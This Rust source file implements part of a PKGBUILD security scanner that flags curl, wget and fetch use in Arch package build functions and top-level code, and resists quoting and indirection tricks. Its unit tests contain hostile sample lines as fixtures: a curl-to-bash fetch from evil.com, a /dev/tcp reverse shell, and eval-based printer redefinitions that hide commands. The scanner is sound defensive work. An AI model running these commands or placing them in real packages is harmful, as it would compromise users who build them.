//! Pattern-based analyzer using the rule engine

use super::SecurityAnalyzer;
use crate::error::Result;
use crate::rules::RuleEngine;
use crate::textutil::{logical_lines, normalize_shell_quoting};
use crate::types::{AnalysisContext, Category, FileType, Finding, Location, Severity};
use async_trait::async_trait;
use std::sync::Arc;

/// Analyzer that uses pattern matching from the rule engine
pub struct PatternAnalyzer {
    rule_engine: Arc<RuleEngine>,
}

impl PatternAnalyzer {
    /// Create a new pattern analyzer
    pub fn new(rule_engine: Arc<RuleEngine>) -> Self {
        Self { rule_engine }
    }
}

/// Finding id of the Medium mention raised for an exempt one-literal message line
/// that a High or Critical rule would otherwise have matched.
pub(crate) const MESSAGE_MENTION_ID: &str = "META-008";

#[async_trait]
impl SecurityAnalyzer for PatternAnalyzer {
    async fn analyze(&self, context: &AnalysisContext) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        // Printer names the package redefines into something that can run its
        // arguments (`warning() { "$@" | sh; }`): code everywhere, never inert.
        let shadow = context.shadowed_printers();
        let shadowed = context.shadowed_names();

        // Analyze PKGBUILD content. A second pass runs over the same text with
        // calls to a redefined printer replaced by what they execute, so the
        // ordinary rules see the real command; hits already reported on the
        // same line are not repeated.
        // Local files the package ships next to the PKGBUILD, by name: a
        // `. "$srcdir/vars.conf"` brings their assignments into scope.
        let sidecars: Vec<(String, String)> = context
            .all_scripts()
            .filter(|s| s.file_type == FileType::SourceFile)
            .filter_map(|s| {
                let name = s.path.file_name()?.to_str()?.to_string();
                Some((name, s.content.clone()))
            })
            .collect();
        let mut variants = vec![context.pkgbuild.raw_content.clone()];
        variants.extend(shadow.inline_calls(&context.pkgbuild.raw_content));
        variants.extend(crate::resolve::inline_sourced_assignments(
            &context.pkgbuild.raw_content,
            &sidecars,
        ));
        let mut seen: std::collections::HashSet<(String, usize)> = Default::default();
        for text in &variants {
            let pkgbuild_matches =
                self.rule_engine
                    .match_content_with(text, FileType::Pkgbuild, shadowed);
            for rule_match in pkgbuild_matches {
                if !seen.insert((rule_match.rule_id.clone(), rule_match.line)) {
                    continue;
                }
                if rule_match.rule_id == MESSAGE_MENTION_ID {
                    findings.push(crate::rules::message_mention_finding(
                        &context.file_path,
                        rule_match.line,
                        &rule_match.context,
                        &rule_match.matched_text,
                        "pkgbuild",
                    ));
                    continue;
                }
                if let Some(rule) = self.rule_engine.get_rule(&rule_match.rule_id) {
                    findings.push(Finding {
                        id: rule.id.clone(),
                        severity: rule.severity,
                        category: rule.category.clone(),
                        title: rule.name.clone(),
                        description: rule.description.clone(),
                        location: Location {
                            file: context.file_path.clone(),
                            line: Some(rule_match.line),
                            column: Some(rule_match.column),
                            snippet: Some(rule_match.context.clone()),
                        },
                        recommendation: rule.recommendation.clone(),
                        cwe_id: rule.cwe_id.clone(),
                        metadata: serde_json::json!({
                            "matched_text": rule_match.matched_text,
                        }),
                    });
                }
            }
        }

        // Analyze install scriptlets, ALPM side scripts (*.hook) and local source
        // sidecars (helper scripts shipped next to the PKGBUILD). Install
        // scriptlets and hooks run with elevated trust during a pacman
        // transaction; sidecars run inside build()/package(). A sidecar is
        // tagged `FileType::SourceFile` by the scanner, a file type that every
        // PKGBUILD rule also applies to (see `RuleEngine::add_rule`).
        for script in context.all_scripts() {
            let is_hook = script.path.extension().and_then(|e| e.to_str()) == Some("hook");
            let file_type = script.file_type;
            let kind = if is_hook {
                "alpm hook"
            } else if file_type == FileType::SourceFile {
                "source sidecar"
            } else {
                "install script"
            };
            let mut variants = vec![script.content.clone()];
            variants.extend(shadow.inline_calls(&script.content));
            variants.extend(crate::resolve::inline_sourced_assignments(
                &script.content,
                &sidecars,
            ));
            let mut seen: std::collections::HashSet<(String, usize)> = Default::default();
            for text in &variants {
                let script_matches = self
                    .rule_engine
                    .match_content_with(text, file_type, shadowed);

                for rule_match in script_matches {
                    if !seen.insert((rule_match.rule_id.clone(), rule_match.line)) {
                        continue;
                    }
                    if rule_match.rule_id == MESSAGE_MENTION_ID {
                        findings.push(crate::rules::message_mention_finding(
                            &script.path,
                            rule_match.line,
                            &rule_match.context,
                            &rule_match.matched_text,
                            kind,
                        ));
                        continue;
                    }
                    if let Some(rule) = self.rule_engine.get_rule(&rule_match.rule_id) {
                        findings.push(Finding {
                            id: rule.id.clone(),
                            severity: rule.severity,
                            category: rule.category.clone(),
                            title: format!("{} ({})", rule.name, kind),
                            description: rule.description.clone(),
                            location: Location {
                                file: script.path.clone(),
                                line: Some(rule_match.line),
                                column: Some(rule_match.column),
                                snippet: Some(rule_match.context.clone()),
                            },
                            recommendation: rule.recommendation.clone(),
                            cwe_id: rule.cwe_id.clone(),
                            metadata: serde_json::json!({
                                "matched_text": rule_match.matched_text,
                                "in_install_script": !matches!(file_type, FileType::SourceFile),
                                "script_kind": kind,
                            }),
                        });
                    }
                }
            }
        }

        // Resolve variables and index the functions once for the whole file;
        // every entry function below reads from this.
        let index = crate::resolve::FunctionIndex::new(&context.pkgbuild.raw_content);

        // Analyze function bodies for specific patterns
        for (func_name, func_body) in &context.pkgbuild.functions {
            // Every function makepkg itself runs for a scan target (pkgver/
            // build/check/package*), not just build/package. prepare() is left
            // out on purpose: fetching sources there (`cargo fetch --locked`) is
            // what the packaging guidelines ask for, and a fetch piped into a
            // shell is caught by the pipe-to-shell rules there. Helper functions are not entry
            // points: they are attributed to whichever entry point calls them
            // (via the resolved text), so an uncalled helper stays quiet.
            if !matches!(func_name.as_str(), "pkgver" | "build" | "check" | "package")
                && !func_name.starts_with("package_")
            {
                continue;
            }
            let func_findings =
                self.analyze_function(context, func_name, func_body, shadowed, &index)?;
            findings.extend(func_findings);
        }

        // Top-level code runs when the PKGBUILD is sourced: everything outside
        // the function bodies.
        let mut in_fn = vec![false; context.pkgbuild.raw_content.lines().count() + 1];
        for f in context.pkgbuild.functions.values() {
            for flag in in_fn.iter_mut().take(f.line_end + 1).skip(f.line_start) {
                *flag = true;
            }
        }
        let top_raw: String = context
            .pkgbuild
            .raw_content
            .lines()
            .enumerate()
            .map(|(i, l)| if in_fn[i + 1] { "" } else { l })
            .collect::<Vec<_>>()
            .join("\n");
        let top = executed_top_level(&top_raw);
        if !top.trim().is_empty() {
            let body = crate::parser::FunctionBody {
                name: "(top level)".to_string(),
                content: top,
                line_start: 1,
                line_end: in_fn.len(),
            };
            findings.extend(self.analyze_function(
                context,
                "(top level)",
                &body,
                shadowed,
                &index,
            )?);
        }

        Ok(findings)
    }

    fn name(&self) -> &str {
        "pattern"
    }
}

impl PatternAnalyzer {
    /// Analyze a specific function for security issues
    fn analyze_function(
        &self,
        context: &AnalysisContext,
        func_name: &str,
        func_body: &crate::parser::FunctionBody,
        shadowed: &std::collections::HashSet<String>,
        index: &crate::resolve::FunctionIndex,
    ) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        // Check for network access in any function / top-level code
        {
            let network_patterns = [
                ("curl", "Network access in build function"),
                ("wget", "Network access in build function"),
                ("fetch", "Network access in build function"),
            ];

            // Matched per logical line, so a comment silences only itself. The
            // old whole-body test skipped the function if `# curl` appeared
            // ANYWHERE in it, so one comment line hid a real `curl` on the next.
            // Each line is de-quoted the way the shell reads it (`"curl" url` is
            // `curl url`) and lower-cased so `CURL` cannot evade.
            //
            // Also match the variable-resolved text (`c=curl; $c url`, a
            // top-level `_c=curl` used here) and the bodies of top-level helper
            // functions this one calls, so indirection cannot hide the fetch.
            let resolved_text = index.text_for(func_name);
            let logical: Vec<(usize, String)> = logical_lines(&func_body.content)
                .into_iter()
                .chain(logical_lines(&resolved_text))
                .collect();
            // Printed text (a `cat <<'EOF'` README body, `echo "run curl ..."`)
            // is a mention, not a download.
            let strs: Vec<&str> = logical.iter().map(|(_, l)| l.as_str()).collect();
            let inert =
                crate::rules::inert_kinds_with(&strs, shadowed, crate::rules::MsgContext::Pkgbuild);
            let lines: Vec<String> = logical
                .iter()
                .zip(inert)
                .filter(|((_, line), inert)| {
                    !inert.suppresses(Severity::High) && !line.trim_start().starts_with('#')
                })
                .map(|((_, line), _)| normalize_shell_quoting(line).to_lowercase())
                .collect();
            for (pattern, message) in &network_patterns {
                if lines.iter().any(|line| invokes_command(line, pattern)) {
                    findings.push(Finding {
                        id: "FUNC-001".to_string(),
                        severity: Severity::High,
                        category: Category::NetworkSecurity,
                        title: message.to_string(),
                        description: format!(
                            "Function '{}' contains network access command '{}'",
                            func_name, pattern
                        ),
                        location: Location {
                            file: context.file_path.clone(),
                            line: Some(func_body.line_start),
                            column: None,
                            snippet: None,
                        },
                        recommendation:
                            "Network access should happen in source= array, not build functions"
                                .to_string(),
                        cwe_id: None,
                        metadata: serde_json::json!({
                            "function": func_name,
                            "pattern": pattern,
                        }),
                    });
                }
            }
        }

        Ok(findings)
    }
}

/// Whether `w` is a plain `NAME=value` / `NAME+=value` / `NAME[i]=value` word.
fn is_assignment_word(w: &str) -> bool {
    let Some((lhs, _)) = w.split_once('=') else {
        return false;
    };
    let lhs = lhs.strip_suffix('+').unwrap_or(lhs);
    let name = lhs.split('[').next().unwrap_or("");
    !name.is_empty()
        && !name.starts_with(|c: char| c.is_ascii_digit())
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        && (lhs.len() == name.len() || lhs.ends_with(']'))
}

/// Whether `line` has any character that could run or redirect something
/// (`$`, backtick, `<`, `>`, `;`, `&`, `|`) outside single quotes. Text after a
/// word-initial `#` is a comment and is not looked at.
fn has_active_metachar(line: &str) -> bool {
    let b = line.as_bytes();
    let (mut sq, mut dq) = (false, false);
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        if sq {
            sq = c != b'\'';
        } else if c == b'\\' {
            i += 1;
        } else if c == b'\'' && !dq {
            sq = true;
        } else if c == b'"' {
            dq = !dq;
        } else if matches!(c, b'$' | b'`' | b'<' | b'>' | b';' | b'&' | b'|') {
            return true;
        } else if c == b'#' && !dq && (i == 0 || b[i - 1].is_ascii_whitespace()) {
            return false;
        }
        i += 1;
    }
    false
}

/// Top-level text with data-only lines blanked, by a positive whitelist: a line
/// is blanked only when ALL of these hold, and every other line is kept.
///   * the lexer starts and ends the line outside any quote or substitution and
///     is certain about it;
///   * no `$`, backtick, `<`, `>`, `;`, `&` or `|` outside single quotes;
///   * it is a plain `name=literal` assignment, an `name=(` array start, or an
///     element line inside such an array (not inside a bare `( .. )` group);
///   * nothing but whitespace or a comment follows the paren that closes the
///     array (position taken from the lexer).
///
/// Line count is preserved.
fn executed_top_level(text: &str) -> String {
    use crate::textutil::{scan_line, split_words, LexState};
    let mut st = LexState::default();
    let mut array_open = false;
    let mut out = Vec::new();
    for line in text.lines() {
        let open_at_start = st.is_open();
        let depth_at_start = st.depth;
        let scan = scan_line(line, &mut st);
        let t = line.trim();
        let mut data = false;
        if array_open && depth_at_start == 0 {
            array_open = false; // lost track: nothing is trusted
        }
        let clean = !open_at_start
            && !st.is_open()
            && !scan.uncertain
            && !t.is_empty()
            && !t.starts_with('#')
            // `$(`, `${` and backticks are kept even inside single quotes: a
            // literal like x='a[$(curl ..)]' can be evaluated later (arithmetic).
            && !(line.contains("$(") || line.contains("${") || line.contains('`'))
            && !has_active_metachar(line);
        let mut starts_array = false;
        if clean {
            if array_open {
                data = depth_at_start > 0;
            } else if depth_at_start == 0 {
                if let Some((lhs, rest)) = t.split_once('=') {
                    let lhs_ok = is_assignment_word(&format!("{lhs}="));
                    if lhs_ok && rest.starts_with('(') {
                        data = true;
                        starts_array = true;
                    } else if lhs_ok {
                        data = split_words(rest).len() <= 1;
                    }
                }
            }
            if data {
                if let Some(pos) = scan.close_at {
                    let tail = line[pos + 1..].trim();
                    if !tail.is_empty() && !tail.starts_with('#') {
                        data = false;
                    }
                }
            }
        }
        array_open = st.depth > 0 && (array_open || starts_array);
        out.push(if data { "" } else { line });
    }
    out.join("\n")
}

/// Whether a de-quoted, lower-cased shell line runs `cmd` or expands a `$cmd` /
/// `${cmd}` variable.
///
/// The command name needs a word boundary on the left, so `libcurl`,
/// `prefetch` and `my_wget` are build-target names, not downloads (#35). A `/`
/// or `\` is a boundary, so `/usr/bin/curl` and `\curl` still count. It must be
/// followed by whitespace (space OR tab), as a command with arguments is.
fn invokes_command(line: &str, cmd: &str) -> bool {
    if line.contains(&format!("${cmd}")) || line.contains(&format!("${{{cmd}")) {
        return true;
    }
    line.match_indices(cmd).any(|(start, _)| {
        let bounded_left = line[..start]
            .chars()
            .next_back()
            .is_none_or(|c| !(c.is_alphanumeric() || matches!(c, '_' | '-' | '.')));
        let has_args = line[start + cmd.len()..]
            .chars()
            .next()
            .is_some_and(char::is_whitespace);
        bounded_left && has_args
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::{PkgbuildParser, StaticParser};
    use crate::types::ScanConfig;
    use std::path::PathBuf;

    fn create_test_context(pkgbuild_content: &str) -> AnalysisContext {
        let parser = StaticParser::new();
        let pkgbuild = parser.parse(pkgbuild_content).unwrap();

        AnalysisContext {
            shadow: Default::default(),
            pkgbuild,
            install_script: None,
            side_scripts: vec![],
            local_binaries: vec![],
            config: ScanConfig::default(),
            file_path: PathBuf::from("PKGBUILD"),
            registry: None,
        }
    }

    #[tokio::test]
    async fn test_detect_curl_bash() {
        let rule_engine = Arc::new(RuleEngine::default());
        let analyzer = PatternAnalyzer::new(rule_engine);

        let context = create_test_context(
            r#"
pkgname=test
pkgver=1.0
pkgrel=1
build() {
    curl https://evil.com/script.sh | bash
}
"#,
        );

        let findings = analyzer.analyze(&context).await.unwrap();
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.id == "DLE-001"));
    }

    #[tokio::test]
    async fn func001_case_variation_still_flags() {
        // FUNC-001 matches the build/package body case-insensitively,
        // so `CURL` in build() must still flag network access.
        let rule_engine = Arc::new(RuleEngine::default());
        let analyzer = PatternAnalyzer::new(rule_engine);
        let context = create_test_context(
            "pkgname=test\npkgver=1.0\npkgrel=1\nbuild() {\n    CURL https://evil.com/x -o out\n}\n",
        );
        let findings = analyzer.analyze(&context).await.unwrap();
        assert!(
            findings.iter().any(|f| f.id == "FUNC-001"),
            "uppercase CURL in build() must still raise FUNC-001: {findings:?}"
        );
    }

    async fn func001_ids(build_body: &str) -> bool {
        let analyzer = PatternAnalyzer::new(Arc::new(RuleEngine::default()));
        let context = create_test_context(&format!(
            "pkgname=test\npkgver=1\npkgrel=1\nbuild() {{\n{build_body}\n}}\n"
        ));
        let findings = analyzer.analyze(&context).await.unwrap();
        findings.iter().any(|f| f.id == "FUNC-001")
    }

    #[tokio::test]
    async fn func001_build_target_names_are_not_downloads() {
        // Reported in #35: building a target whose name ENDS in a command name
        // (`libcurl`, `prefetch`) is not network access.
        for target in [
            "libcurl", "libwget", "prefetch", "my_curl", "my-wget", "my.fetch",
        ] {
            assert!(
                !func001_ids(&format!(
                    "    cmake --build build --target {target} --parallel"
                ))
                .await,
                "building {target} is not network access"
            );
        }
    }

    #[tokio::test]
    async fn func001_download_commands_still_flag() {
        for line in [
            "curl https://example.com/src.tar.gz",
            "wget https://example.com/src.tar.gz",
            "fetch https://example.com/src.tar.gz",
            "/usr/bin/curl https://example.com/src.tar.gz",
            "./wget https://example.com/src.tar.gz",
            "\\curl https://example.com/src.tar.gz",
            "true;curl https://example.com/src.tar.gz",
            "make && wget https://example.com/src.tar.gz",
            "x=$(curl -s https://example.com/v)",
            "$curl https://example.com/src.tar.gz",
            "${wget} https://example.com/src.tar.gz",
            "cmake --build build --target libcurl; curl https://example.com/x",
        ] {
            assert!(
                func001_ids(&format!("    {line}")).await,
                "{line:?} must flag"
            );
        }
    }

    #[tokio::test]
    async fn func001_a_comment_only_silences_itself() {
        // The old check skipped the WHOLE function when `# curl` appeared
        // anywhere in it, so one comment line hid a real download.
        assert!(
            func001_ids("    # curl is only needed for the -git variant\n    curl https://evil.example/x -o y")
                .await,
            "a `# curl` comment must not hide a real curl on another line"
        );
        assert!(
            !func001_ids("    # curl https://example.com is mirrored in source=()").await,
            "a comment on its own is not network access"
        );
    }

    #[tokio::test]
    async fn func001_whitespace_and_quoting_cannot_hide_the_command() {
        for line in [
            "curl\thttps://example.com/x -o y",
            "\"curl\" https://example.com/x -o y",
            "'w'get https://example.com/x",
        ] {
            assert!(
                func001_ids(&format!("    {line}")).await,
                "{line:?} must flag"
            );
        }
    }

    #[tokio::test]
    async fn test_clean_pkgbuild() {
        let rule_engine = Arc::new(RuleEngine::default());
        let analyzer = PatternAnalyzer::new(rule_engine);

        let context = create_test_context(
            r#"
pkgname=test
pkgver=1.0
pkgrel=1
source=("https://example.com/test.tar.gz")
sha256sums=('abc123')
build() {
    make
}
package() {
    make DESTDIR="$pkgdir" install
}
"#,
        );

        let findings = analyzer.analyze(&context).await.unwrap();
        // Should have no critical findings
        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[tokio::test]
    async fn sidecar_scripts_are_scanned_with_pkgbuild_rules() {
        let analyzer = PatternAnalyzer::new(Arc::new(RuleEngine::default()));
        let mut context = create_test_context("pkgname=t\npkgver=1\npkgrel=1\n");
        context
            .side_scripts
            .push(crate::parser::ParsedInstallScript {
                content: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n".to_string(),
                path: PathBuf::from("helper.sh"),
                hooks: vec![],
                file_type: FileType::SourceFile,
            });
        let findings = analyzer.analyze(&context).await.unwrap();
        let f = findings.iter().find(|f| f.id == "SHELL-001");
        assert!(f.is_some(), "sidecar reverse shell missed: {findings:?}");
        assert_eq!(f.unwrap().location.file, PathBuf::from("helper.sh"));
    }

    async fn func001(pkgbuild: &str) -> bool {
        let rule_engine = Arc::new(RuleEngine::default());
        let analyzer = PatternAnalyzer::new(rule_engine);
        let ctx = create_test_context(pkgbuild);
        analyzer
            .analyze(&ctx)
            .await
            .unwrap()
            .iter()
            .any(|f| f.id == "FUNC-001")
    }

    #[tokio::test]
    async fn func001_covers_every_makepkg_function_and_top_level() {
        for f in ["pkgver", "check", "build"] {
            let pb = format!(
                "pkgname=a\npkgver=1\npkgrel=1\n{f}() {{\n  curl -s https://evil.example/x\n}}\n"
            );
            assert!(func001(&pb).await, "{f}");
        }
        assert!(func001("pkgname=a\npkgver=1\npkgrel=1\ncurl -s https://evil.example/x\n").await);
    }

    #[tokio::test]
    async fn func001_ignores_prepare_and_named_commands_at_top_level() {
        assert!(
            !func001("pkgname=a\npkgver=1\npkgrel=1\nprepare() {\n  curl -s https://e.example/x -o f\n}\n")
                .await
        );
        assert!(
            !func001("pkgname=a\npkgver=1\npkgrel=1\ndepends=('curl'\n  'wget')\n# curl x\n").await
        );
        assert!(
            func001("pkgname=a\npkgver=1\npkgrel=1\n_v=$(curl -s https://e.example/v)\n").await
        );
    }

    #[tokio::test]
    async fn func001_ignores_uncalled_helpers_and_quiet_functions() {
        assert!(
            !func001(
                "pkgname=a\npkgver=1\npkgrel=1\nhelper() {\n  curl -s https://e.example/x\n}\n"
            )
            .await
        );
        assert!(
            !func001(
                "pkgname=a\npkgver=1\npkgrel=1\npkgver() {\n  git -C src describe --tags\n}\n# curl docs\n"
            )
            .await
        );
    }

    #[tokio::test]
    async fn func001_top_level_keeps_every_uncertain_line() {
        let head = "pkgname=a\npkgver=1\npkgrel=1\n";
        for body in [
            // multi-line command substitution
            "_x=$(\n  curl -fsSL https://evil.example/x -o f\n)\n",
            // quote opened on an earlier line must not blank a later command
            "optdepends=(\"foo: multi\nline\" )\ncurl -fsSL https://evil.example/x -o f\n",
            // command after an assignment
            "x=1; curl -fsSL https://evil.example/x -o f\n",
            "X=1 curl -fsSL https://evil.example/x -o f\n",
            // command after an array closes
            "a=(x y); curl -fsSL https://evil.example/x -o f\n",
            "a=(\n  'glibc'\n); curl -fsSL https://evil.example/x -o f #)\n",
            // process substitution as an array element
            "_h=(<(curl -fsSL https://evil.example/x -o f))\n",
            "a=(\n  'glibc'\n  <(curl -fsSL https://evil.example/x -o f)\n)\n",
            // a bare subshell group is not an array
            "(\n  curl -fsSL https://evil.example/x -o f\n)\n",
            // single-quoted payload that a later arithmetic eval could run
            "x='a[$(curl -fsSL https://evil.example/x -o f)]'\ndeclare -i n\nn=$x\n",
            // expansions are not trusted to be data
            "DLAGENTS=\"${DLAGENTS[@]/curl /curl -L}\"\n",
        ] {
            assert!(func001(&format!("{head}{body}")).await, "{body:?}");
        }
        // still quiet: arrays and plain assignments
        assert!(
            !func001(&format!(
                "{head}depends=('curl' 'wget')\nmakedepends=(\n  'curl'\n  'wget'\n)\nX=\"a curl b\"\n"
            ))
            .await
        );
    }

    #[tokio::test]
    async fn func001_reports_curl_inside_a_printed_heredoc() {
        // A printed heredoc can be faked by desyncing the lexer, so it never hides
        // a High finding: README text that spells out a curl is reported.
        assert!(
            func001(
                "pkgname=a\npkgver=1\npkgrel=1\npackage() {\n  cat <<'NOTES'\ncurl -fsSL https://example.org/x -o f\nNOTES\n}\n"
            )
            .await
        );
        // an exempt one-literal print is only a mention
        assert!(
            !func001(
                "pkgname=a\npkgver=1\npkgrel=1\npackage() {\n  echo \"try: curl https://example.org/x\"\n}\n"
            )
            .await
        );
    }

    #[tokio::test]
    async fn redefined_printer_disables_every_pure_print() {
        // Each form turns `msg "..."` (no operator on the line) into code, so the
        // fetch inside it must be reported (FUNC-001 sees the curl).
        let call = "package() {\n  msg \"curl -o /tmp/x https://evil.example/x\"\n}\n";
        let head = "pkgname=a\npkgver=1\npkgrel=1\n";
        for def in [
            "msg() { eval \"$1\"; }\n",
            "echo() { eval \"$@\"; }\nmsg() { echo \"$1\"; }\n",
            "alias echo=eval\nmsg() { echo \"$1\"; }\n",
            "enable -n echo\nmsg() { echo \"$1\"; }\n",
            "enable -n\nmsg() { echo \"$1\"; }\n",
            "builtin() { eval \"$@\"; }\nmsg() { echo \"$1\"; }\n",
        ] {
            assert!(func001(&format!("{head}{def}{call}")).await, "{def:?}");
        }
    }
}
